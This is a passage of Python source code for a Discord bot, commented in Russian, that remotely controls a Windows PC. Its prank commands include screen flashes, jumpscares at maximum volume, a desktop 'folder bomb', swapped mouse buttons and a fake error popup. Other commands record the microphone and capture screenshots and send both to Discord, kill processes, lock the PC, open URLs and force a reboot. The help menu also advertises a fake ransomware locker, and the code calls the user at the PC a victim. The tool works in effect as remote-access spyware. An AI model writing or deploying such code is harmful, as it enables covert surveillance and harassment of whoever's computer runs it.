    label.pack()

    # Анимация движения
    for _ in range(100):
        x = random.randint(100, 800)
        y = random.randint(100, 600)
        root.geometry(f"+{x}+{y}")
        root.update()
        time.sleep(0.1)
    
    root.destroy()

@bot.slash_command(name='ghost_cursor', description='Запустить призрачный курсор на 10 секунд', guild_ids=[711194167757242368])
async def ghost_cursor_slash(ctx: discord.ApplicationContext):
    await ctx.respond("👻 Призрачный курсор на свободе!")
    await asyncio.to_thread(run_ghost_cursor)

def trigger_flash():
    try:
        current_brightness = sbc.get_brightness()[0]
        sbc.set_brightness(100)
        time.sleep(0.7)
        sbc.set_brightness(current_brightness)
    except:
        pass

@bot.slash_command(name='flashbang', description='Вспышка яркости на 0.7 сек', guild_ids=[711194167757242368])
async def flashbang_slash(ctx: discord.ApplicationContext):
    await ctx.respond("🔦 Лови флешбанг!")
    await asyncio.to_thread(trigger_flash)


def create_and_destroy_folders():
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    folder_names = ["Ой", "Упс", "Я тут", "Зачем?", "Хе-хе", "Взлом?", "Error", "404"]
    created_folders = []
    
    for i in range(50):
        name = f"{random.choice(folder_names)}_{i}"
        path = os.path.join(desktop, name)
        try:
            os.makedirs(path, exist_ok=True)
            created_folders.append(path)
            time.sleep(0.05)
        except: continue
        
    time.sleep(10) # Ждем 10 секунд перед удалением
    
    # Удаляем все созданные папки
    for path in created_folders:
        try:
            shutil.rmtree(path)
        except: continue

@bot.slash_command(name='folder_bomb', description='Создать 50 папок на рабочем столе и удалить их через 10 сек', guild_ids=[711194167757242368])
async def folder_bomb_slash(ctx: discord.ApplicationContext):
    await ctx.respond("📂 Папочная бомба активирована! У вас есть 10 секунд на панику.")
    await asyncio.to_thread(create_and_destroy_folders)


def shake_window():
    import win32gui, win32con, random
    hwnd = win32gui.GetForegroundWindow()
    if not hwnd: return
    
    # Если окно на весь экран — восстанавливаем его
    tup = win32gui.GetWindowPlacement(hwnd)
    if tup[1] == win32con.SW_SHOWMAXIMIZED:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        time.sleep(0.1)

    rect = win32gui.GetWindowRect(hwnd)
    x, y, w, h = rect[0], rect[1], rect[2] - rect[0], rect[3] - rect[1]
    
    for _ in range(30):
        offset_x = random.randint(-15, 15)
        offset_y = random.randint(-15, 15)
        win32gui.MoveWindow(hwnd, x + offset_x, y + offset_y, w, h, True)
        time.sleep(0.05)
    
    win32gui.MoveWindow(hwnd, x, y, w, h, True)

@bot.slash_command(name='earthquake', description='Потрясти активное окно 3 секунды', guild_ids=[711194167757242368])
async def earthquake_slash(ctx: discord.ApplicationContext):
    await ctx.respond("🫨 Начинаю землетрясение активного окна!")
    await asyncio.to_thread(shake_window)


def shuffle_desktop_icons():
    LVM_FIRST = 0x1000
    LVM_GETITEMCOUNT = LVM_FIRST + 4
    LVM_SETITEMPOSITION = LVM_FIRST + 15

    # 1. Находим дескриптор (handle) рабочего стола
    progman = win32gui.FindWindow("Progman", None)
    shell_dll = win32gui.FindWindowEx(progman, 0, "SHELLDLL_DefView", None)
    
    if not shell_dll:
        def callback(hwnd, extra):
            if win32gui.GetClassName(hwnd) == "WorkerW":
                child = win32gui.FindWindowEx(hwnd, 0, "SHELLDLL_DefView", None)
                if child:
                    extra.append(child)
        handles = []
        win32gui.EnumWindows(callback, handles)
        if handles:
            shell_dll = handles[0]
            
    listview = win32gui.FindWindowEx(shell_dll, 0, "SysListView32", None)
    
    if not listview:
        return False

    # 2. Получаем количество иконок (используем нашу ручную константу)
    count = win32gui.SendMessage(listview, LVM_GETITEMCOUNT, 0, 0)
    
    # 3. Узнаем размер экрана
    width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)

    # 4. Раскидываем иконки
    for i in range(count):
        x = random.randint(0, width - 100)
        y = random.randint(0, height - 100)
        # Используем LVM_SETITEMPOSITION напрямую
        win32gui.SendMessage(listview, LVM_SETITEMPOSITION, i, win32api.MAKELONG(x, y))
    
    return True

@bot.slash_command(name='icon_shuffle', description='Раскидать иконки рабочего стола в случайном порядке', guild_ids=[711194167757242368])
async def icon_shuffle_slash(ctx: discord.ApplicationContext):
    
    await ctx.respond("🌪️ Начинаю землетрясение на рабочем столе...")
    
    success = await asyncio.to_thread(shuffle_desktop_icons)
    
    if success:
        await ctx.followup.send("✅ Иконки успешно разбросаны! (Если ничего не изменилось, нажми ПКМ на рабочем столе -> Вид -> Сними галочку 'Упорядочить значки автоматически')")
    else:
        await ctx.followup.send("❌ Не удалось найти рабочий стол.")


@bot.slash_command(name='screen_off', description='Погасить мониторы ПК', guild_ids=[711194167757242368])
async def screen_off_slash(ctx: discord.ApplicationContext):
    
    await ctx.respond("🔌 Мониторы отправлены в спящий режим. (Пошевели мышкой на ПК, чтобы включить обратно)")
    
    await asyncio.to_thread(ctypes.windll.user32.SendMessageW, 0xFFFF, 0x0112, 0xF170, 2)

@bot.slash_command(name='swap_mouse', description='Поменять местами левую и правую кнопки мыши', guild_ids=[711194167757242368])
async def swap_mouse_slash(ctx: discord.ApplicationContext):
    
    global mouse_swapped
    mouse_swapped = not mouse_swapped # Переключаем состояние (True/False)
    
    # 1 - инвертировать, 0 - вернуть в норму
    state_to_set = 1 if mouse_swapped else 0
    await asyncio.to_thread(ctypes.windll.user32.SwapMouseButton, state_to_set)
    
    if mouse_swapped:
        await ctx.respond("🔄 Кнопки мыши **ИНВЕРТИРОВАНЫ**! (Левая стала правой)")
    else:
        await ctx.respond("✅ Кнопки мыши **ВОЗВРАЩЕНЫ В НОРМУ**.")

@bot.slash_command(name='jumpscare', description='Случайный скример (звук на 100% + картинка)', guild_ids=[711194167757242368])
async def jumpscare_slash(ctx: discord.ApplicationContext):
    import random # На всякий случай, если забыл импортировать в начале

    # 1. Выбираем случайные пути из словарей
    # .values() вытаскивает именно пути к файлам, а не названия
    all_images = list(AVAILABLE_IMAGES.values())
    all_sounds = list(AVAILABLE_SOUNDS.values())

    if not all_images or not all_sounds:
        return await ctx.respond("❌ Словари изображений или звуков пусты!", ephemeral=True)

    scary_image = random.choice(all_images)
    scary_sound = random.choice(all_sounds)

    await ctx.respond(f"👻 Протокол «Хаос» запущен! (Выбрано: {os.path.basename(scary_sound)})")

    # 2. Выкручиваем системный звук на максимум
    await asyncio.to_thread(pyautogui.press, 'volumeup', presses=50)
    
    global window_process, IMAGE_PATH, window_opened_by
    IMAGE_PATH = scary_image
    
    if window_process is None or not window_process.is_alive():
        window_opened_by = 'manual'
        window_process = multiprocessing.Process(target=show_fullscreen_process, args=(IMAGE_PATH,), daemon=True)
        window_process.start()
    # 3. Воспроизводим звук
    try:
        pygame.mixer.music.load(scary_sound)
        pygame.mixer.music.play()
    except Exception as e:
        await ctx.send(f"Ошибка звука: {e}")
        
        # Наблюдатель выключит звук, когда окно закроют
        asyncio.create_task(watch_window(window_process))

def run_interrogation(question):
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True) # Окно поверх всех игр и программ
    
    answer = simpledialog.askstring("СИСТЕМА БЕЗОПАСНОСТИ", question, parent=root)
    root.destroy()
    return answer

@bot.slash_command(name='interrogate', description='Вывести окно допроса поверх всех окон', guild_ids=[711194167757242368])
async def interrogate_slash(ctx: discord.ApplicationContext, question: discord.Option(str, "Какой вопрос задать?")):
    
    await ctx.respond(f"🕵️‍♂️ Вывожу допрос на экран: *{question}*\nОжидаю ответа...")
    
    # Бот ждет, пока человек за ПК введет текст и нажмет ОК (или отмену)
    answer = await asyncio.to_thread(run_interrogation, question)
    
    if answer:
        await ctx.followup.send(f"🚨 **Получен ответ с компьютера:**\n`{answer}`")
    else:
        await ctx.followup.send("⚠️ Жертва закрыла окно допроса, так ничего и не ответив!")

def ghost_hack_macro():
    # Открываем меню Пуск
    pyautogui.press('win')
    time.sleep(2) # Ждем пока откроется пуск
    
    # Печатаем notepad и нажимаем Enter
    pyautogui.write('notepad', interval=0.05)
    time.sleep(0.5)
    pyautogui.press('enter')
    
    # Ждем 2 секунды, чтобы Блокнот точно успел открыться на экране
    time.sleep(2)
    
    # Зловеще печатаем текст
    creepy_message = "Z  t r a x n y  t e b z  v  t v o y  z o p y . . .\n"
    pyautogui.write(creepy_message, interval=0.2) # interval=0.2 делает печать медленной
    
    time.sleep(1)
    pyautogui.write("P o m n i s h  m e n y a?", interval=0.3)

@bot.slash_command(name='ghost_notepad', description='Запустить макрос призрачного хакера', guild_ids=[711194167757242368])
async def ghost_notepad_slash(ctx: discord.ApplicationContext):
    
    await ctx.respond("👻 Запускаю призрачный макрос на компьютере...")
    # Отправляем макрос в фон
    await asyncio.to_thread(ghost_hack_macro)

def move_mouse_crazy():
    screen_width, screen_height = pyautogui.size()
    
    for _ in range(50):
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y, duration=0.1)

@bot.slash_command(name='crazy_mouse', description='Хаотично дергать курсор мыши 5 секунд', guild_ids=[711194167757242368])
async def crazy_mouse_slash(ctx: discord.ApplicationContext):
    await ctx.respond("🖱️ Включаю режим сумасшедшей мыши! Держитесь!")
    await asyncio.to_thread(move_mouse_crazy)


def record_audio(duration, filename):
    fs = 44100
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
    sd.wait()
    write_wav(filename, fs, recording)

@bot.slash_command(name='listen', description='Записать 5 секунд аудио с микрофона ПК', guild_ids=[711194167757242368])
async def listen_slash(ctx: discord.ApplicationContext):
    
    await ctx.defer()
    
    file_path = os.path.join(BASE_DIR, "spy_record.wav")
    
    await asyncio.to_thread(record_audio, 10, file_path)
    
    await ctx.followup.send("🎙️ Перехват звука с микрофона завершен:", file=discord.File(file_path))

@bot.slash_command(name='help', description='Показать панель управления всеми модулями бота', guild_ids=[711194167757242368])
async def help_slash(ctx: discord.ApplicationContext):
    embed = discord.Embed(
        title="☣️ ПАНЕЛЬ УПРАВЛЕНИЯ «PRESENT»",
        description="**Внимание:** Используйте модули осторожно. Система может не пережить полной нагрузки.",
        color=discord.Color.from_rgb(192, 57, 43) # Кроваво-красный
    )

    # --- КАТЕГОРИЯ 1: ЯДЕРНЫЙ ТЕРРОР (GDI & Hardcore) ---
    embed.add_field(
        name="☢️ Ядерный хаос (GDI)",
        value=(
            "`/digital_purgatory` — **АД:** Звук, визуализация и блокировка\n"
            "`/screen_melt` — Эффект тающего экрана (стекание)\n"
            "`/gdi_vortex` — Закрутить экран в бесконечный вихрь\n"
            "`/gdi_feedback` — Рекурсивный тоннель (фрактал)\n"
            "`/monitor_artifacts` — Имитация смерти видеокарты"
        ),
        inline=False
    )

    # --- КАТЕГОРИЯ 2: УПРАВЛЕНИЕ МЫШЬЮ И ОКНАМИ ---
    embed.add_field(
        name="🖱️ Манипуляции вводом",
        value=(
            "`/fake_lag` — Дикие лаги курсора (рывками)\n"
            "`/mouse_slow` — Замедление мыши в 10 раз\n"
            "`/invert_mouse` — Инверсия осей X и Y\n"
            "`/swap_mouse` — Поменять ЛКМ и ПКМ местами\n"
            "`/window_runner` — Окна убегают от курсора\n"
            "`/window_shrink` — Сжать окно до нано-размеров"
        ),
        inline=False
    )

    # --- КАТЕГОРИЯ 3: ПСИХОЛОГИЧЕСКИЙ ВАНДАЛИЗМ ---
    embed.add_field(
        name="🧠 Психологические атаки",
        value=(
            "`/fake_ransomware` — **ЛОКЕР:** Блокировка ПК с таймером\n"
            "`/move_exe` — Выбросить EXE игры на рабочий стол\n"
            "`/fake_delete` — Прогресс-бар удаления данных\n"
            "`/folder_bomb` — Взрыв из 50 папок на десктопе\n"
            "`/interrogate` — Окно-допрос поверх всех окон"
        ),
        inline=False
    )

    # --- КАТЕГОРИЯ 4: ВИЗУАЛЬНЫЕ ПРИКОЛЫ ---
    embed.add_field(
        name="🖼️ Визуальные эффекты",
        value=(
            "`/image` — Картинка на весь экран\n"
            "`/jumpscare` — Скример (Звук 100% + Фото)\n"
            "`/dead_pixel` — Битый пиксель на мониторе\n"
            "`/earthquake` — Тряска активного окна\n"
            "`/flashbang` — Светошумовая граната (яркость)\n"
            "`/icon_shuffle` — Перемешать иконки рабочего стола"
        ),
        inline=False
    )

    # --- КАТЕГОРИЯ 5: ШПИОНАЖ И ЗВУК ---
    embed.add_field(
        name="🕵️ Шпионаж и Звук",
        value=(
            "`/screenshot` — Снимок экрана\n"
            "`/listen` — Запись микрофона (10 сек)\n"
            "`/echo_voice` — Эхо из микрофона в колонки\n"
            "`/say` — Озвучить текст (TTS)\n"
            "`/sound` — Проиграть звук из списка\n"
            "`/stop_sound` — Экстренная тишина"
        ),
        inline=False
    )

    # --- КАТЕГОРИЯ 6: СИСТЕМА ---
    embed.add_field(
        name="⚙️ Системные утилиты",
        value=(
            "`/status` — Мониторинг ресурсов ПК\n"
            "`/kill_app` — Закрыть процесс\n"
            "`/volume` — Управление громкостью\n"
            "`/screen_off` — Выключить мониторы\n"
            "`/reboot_pc` — Перезагрузка системы\n"
            "`/restart` — Рестарт бота"
        ),
        inline=False
    )

    # Твоя гифка
    embed.set_image(url="https://cdn.discordapp.com/attachments/724553360325214299/1473699082114568306/kling_20260218_VIDEO_Image1_____5740_0-ezgif.com-video-to-gif-converter.gif?ex=69af8c79&is=69ae3af9&hm=a4ee43c0e8cf276bcda32cb5689ac3be32a0ffc1acde168ca63a1f0c64769986&")
    embed.set_footer(text=f"Host: {os.getlogin()} | Python {sys.version.split()[0]} | Время работы: {int(time.time() - start_time)} сек")

    await ctx.respond(embed=embed)

def show_notification(title, msg):
    notification.notify(
        title=title,
        message=msg,
        app_name="Discord Bot Control",
        timeout=10
    )

@bot.slash_command(name='notify', description='Отправить системное уведомление', guild_ids=[711194167757242368])
async def notify_slash(ctx: discord.ApplicationContext, title: discord.Option(str, "Заголовок"), message: discord.Option(str, "Текст уведомления")):
    
    await ctx.respond("🔔 Уведомление отправлено!")
    await asyncio.to_thread(show_notification, title, message)


def show_error_popup(title, text):
    root = tk.Tk()
    root.withdraw() 
    root.attributes("-topmost", True)
    messagebox.showerror(title, text)
    root.destroy()

@bot.slash_command(name='error_popup', description='Показать фейковую ошибку Windows', guild_ids=[711194167757242368])
async def error_popup_slash(ctx: discord.ApplicationContext, title: discord.Option(str, "Заголовок окна"), text: discord.Option(str, "Текст ошибки")):
    
    await ctx.respond(f"⚠️ Ошибка '{title}' отправлена на экран!")
    await asyncio.to_thread(show_error_popup, title, text)

@bot.slash_command(name='lock_pc', description='Мгновенно заблокировать компьютер', guild_ids=[711194167757242368])
async def lock_pc_slash(ctx: discord.ApplicationContext):
    ctypes.windll.user32.LockWorkStation()
    await ctx.respond("🔒 Компьютер успешно заблокирован!")

@bot.slash_command(name='open_url', description='Открыть ссылку на ПК', guild_ids=[711194167757242368])
async def open_url_slash(ctx: discord.ApplicationContext, url: discord.Option(str, "Введите ссылку (начиная с http/https)")):
    webbrowser.open(url)
    await ctx.respond(f"🌐 Ссылка открыта на ПК: {url}")


@bot.slash_command(name='volume', description='Управление громкостью Windows', guild_ids=[711194167757242368])
async def volume_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Громче", "Тише", "Вкл/Выкл звук (Mute)"])):

    if action == "Громче":
        # Нажимаем кнопку громкости 5 раз (примерно +10%)
        await asyncio.to_thread(pyautogui.press, 'volumeup', presses=5) 
    elif action == "Тише":
        await asyncio.to_thread(pyautogui.press, 'volumedown', presses=5)
    elif action == "Вкл/Выкл звук (Mute)":
        await asyncio.to_thread(pyautogui.press, 'volumemute')
        
    await ctx.respond(f"🔊 Громкость изменена: **{action}**")

@bot.slash_command(name='kill_app', description='Принудительно закрыть программу по имени', guild_ids=[711194167757242368])
async def kill_app_slash(ctx: discord.ApplicationContext, process_name: discord.Option(str, "Имя процесса (например dota2.exe)")):
    killed_count = 0
    # Ищем все процессы с таким именем и убиваем
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
                proc.kill()
                killed_count += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
            
    if killed_count > 0:
        await ctx.respond(f"🔪 Убито процессов ({process_name}): **{killed_count}** шт.")
    else:
        await ctx.respond(f"🤷‍♂️ Процесс с именем `{process_name}` не найден.", ephemeral=True)


def make_screenshot():
    img = ImageGrab.grab()
    buffer = io.BytesIO()
    img.save(buffer, format='PNG')
    buffer.seek(0)
    return buffer

@bot.slash_command(name='screenshot', description='Сделать снимок экрана ПК', guild_ids=[711194167757242368])
async def screenshot_slash(ctx: discord.ApplicationContext):
    
    await ctx.defer() # Говорим Discord, что нужно подождать пару секунд
    buffer = await asyncio.to_thread(make_screenshot)
    await ctx.followup.send("📸 Скриншот вашего экрана:", file=discord.File(fp=buffer, filename='screen.png'))


def speak_text(text):
    with tts_lock:
        try:
            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()
        except Exception as e:
            print(f"Ошибка внутри голосового движка: {e}")

@bot.slash_command(name='say', description='Произнести текст голосом из колонок ПК', guild_ids=[711194167757242368])
async def say_slash(ctx: discord.ApplicationContext, text: discord.Option(str, "Что сказать?")):
    
    await ctx.respond(f"🗣️ Произношу: *{text}*")
    await asyncio.to_thread(speak_text, text)

@bot.slash_command(name='image', description='ы', guild_ids=[711194167757242368])
async def image(
    ctx: discord.ApplicationContext, 
    image_choice: discord.Option(str, name="выбор", description="Какую картинку запустить?", choices=list(AVAILABLE_IMAGES.keys()))):
    
    global window_process, IMAGE_PATH, window_opened_by 
    
    selected_file = AVAILABLE_IMAGES[image_choice]
    IMAGE_PATH = selected_file 
    
    if window_process is None or not window_process.is_alive():
        window_opened_by = 'manual' 
        
        window_process = multiprocessing.Process(target=show_fullscreen_process, args=(IMAGE_PATH,), daemon=True)
        window_process.start()
        
        asyncio.create_task(watch_window(window_process))
        
        await ctx.respond(f"✅ Запускаю: **{image_choice}**!")
    else:
        await ctx.respond("❌ Окно уже открыто. Сначала закрой его.", ephemeral=True)

def play():
    try:
        pygame.mixer.music.load(SOUND_PATH)
        pygame.mixer.music.play()
        print("Воспроизвожу звук на компьютере!")
    except Exception as e:
         print(f"Ошибка при воспроизведении: {e}")

async def search_sounds(ctx: discord.AutocompleteContext):
    return [sound for sound in AVAILABLE_SOUNDS.keys() if sound.lower().startswith(ctx.value.lower())]

@bot.slash_command(name='sound', description='Выбрать и воспроизвести звук', guild_ids=[711194167757242368])
async def play_audio_slash(
    ctx: discord.ApplicationContext,
    sound_choice: discord.Option(str, name="выбор", description="Какой звук включить?", autocomplete=search_sounds)):
    global SOUND_PATH
    
    # Добавляем проверку: вдруг пользователь введет руками название, которого нет в списке
    if sound_choice not in AVAILABLE_SOUNDS:
        await ctx.respond("❌ Такого звука нет в списке!", ephemeral=True)
        return

    # Получаем реальный путь к файлу из словаря
    selected_sound = AVAILABLE_SOUNDS[sound_choice]
    SOUND_PATH = selected_sound
    
    try:
        pygame.mixer.music.load(SOUND_PATH)
        pygame.mixer.music.play()
        await ctx.respond(f"🔊 Воспроизвожу звук: **{sound_choice}**!")
    except Exception as e:
        await ctx.respond(f"❌ Ошибка при воспроизведении: {e}", ephemeral=True)

@bot.slash_command(name='stop_sound', description='Остановить воспроизведение звука', guild_ids=[711194167757242368])
async def stop_audio_slash(ctx: discord.ApplicationContext):
    try:
        if pygame.mixer.music.get_busy(): # Проверяем, играет ли сейчас музыка
            pygame.mixer.music.stop()
            await ctx.respond("🔇 Звук успешно остановлен.")
        else:
            await ctx.respond("🔈 Сейчас и так ничего не играет.", ephemeral=True)
    except Exception as e:
        await ctx.respond(f"❌ Произошла ошибка при остановке звука: {e}", ephemeral=True)

@bot.slash_command(name='launch', description='Запустить приложение на ПК', guild_ids=[711194167757242368])
async def launch_app(
    ctx: discord.ApplicationContext,
    app_choice: discord.Option(str, name="программа", description="Какую программу запустить?", choices=list(AVAILABLE_APPS.keys()))):

    app_path = AVAILABLE_APPS[app_choice]

    try:
        # Запускаем программу (работает только на Windows)
        os.startfile(app_path)
        await ctx.respond(f"✅ Запускаю приложение: **{app_choice}**!")
    except FileNotFoundError:
        await ctx.respond(f"❌ Ошибка: Файл не найден по пути `{app_path}`", ephemeral=True)
    except Exception as e:
        await ctx.respond(f"❌ Произошла ошибка при запуске: {e}", ephemeral=True)

import subprocess
import asyncio

@bot.slash_command(name='reboot_pc', description='Перезагрузить систему (Только для админа)', guild_ids=[711194167757242368])
async def reboot_pc_slash(ctx: discord.ApplicationContext):
    try:
        await ctx.respond("⚠️ **ВНИМАНИЕ:** Инициирована перезагрузка хост-системы. Компьютер уйдет в ребут через 5 секунд...")
        
        await asyncio.sleep(5)

        subprocess.run(["shutdown", "/r", "/f", "/t", "0"], check=True)
        
    except Exception as e:
        # Если что-то пойдет не так (например, нет прав админа в самой Windows)
        await ctx.channel.send(f"❌ Ошибка при попытке перезагрузки системы: {e}")


@bot.slash_command(name='restart', description='Полная перезагрузка бота', guild_ids=[711194167757242368])
async def restart(ctx: discord.ApplicationContext):
    # Проверка прав (как и в других твоих командах)
    is_owner = ctx.author.id == ALLOWED_USER_ID
    has_role = any(role.id == ALLOWED_ROLE_ID for role in ctx.author.roles)

    if is_owner or has_role:
        await ctx.respond("🔄 **Выполняю перезапуск системы...** Бот вернется в сеть через несколько секунд.")
        
        os.execv(sys.executable, ['python'] + sys.argv)
    else:
        await ctx.respond("❌ **У вас нет прав администратора** для выполнения этой команды.", ephemeral=True)

@bot.slash_command(name='status', description='Показать состояние системы и нагрузку ПК', guild_ids=[711194167757242368])
async def status_slash(ctx: discord.ApplicationContext):
    # 1. Расчет времени работы бота
    uptime_seconds = int(time.time() - start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours}ч {minutes}м {seconds}с"

    # 2. Получение данных о системе через psutil
    cpu_usage = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    ram_usage = ram.percent
    
    # Свободное место на диске C: (в ГБ)
    disk = shutil.disk_usage("C:")
    disk_free = disk.free // (1024**3)

    # 3. Статус активных приколов
    pixel_stat = "🔴 Активен" if pixel_process and pixel_process.is_alive() else "⚪ Выключен"
    mouse_stat = "🔄 Инвертированы" if mouse_swapped else "✅ Норма"

    # Создаем красивый Embed
    embed = discord.Embed(
        title="🖥️ Мониторинг системных ресурсов",
        color=discord.Color.blue(),
        timestamp=discord.utils.utcnow()
    )

    embed.add_field(name="⏱️ Аптайм бота", value=f"`{uptime_str}`", inline=True)
    embed.add_field(name="🐍 Python", value=f"`{sys.version.split()[0]}`", inline=True)
    embed.add_field(name="💾 Диск C:", value=f"`{disk_free} ГБ свободно`", inline=True)

    embed.add_field(name="📊 Нагрузка", value=(
        f"**CPU:** `{cpu_usage}%`\n"
        f"**RAM:** `{ram_usage}%` ({ram.used // (1024**2)} МБ)"
    ), inline=False)

    embed.add_field(name="🎮 Статус модулей", value=(
        f"**Битый пиксель:** {pixel_stat}\n"
        f"**Кнопки мыши:** {mouse_stat}\n"
        f"**Target:** `{TARGET_PROCESS}`"
    ), inline=False)

    embed.set_footer(text=f"Запросил: {ctx.author.name}")
    
    await ctx.respond(embed=embed)

if __name__ == '__main__':
    multiprocessing.freeze_support() 
    bot.run(TOKEN)
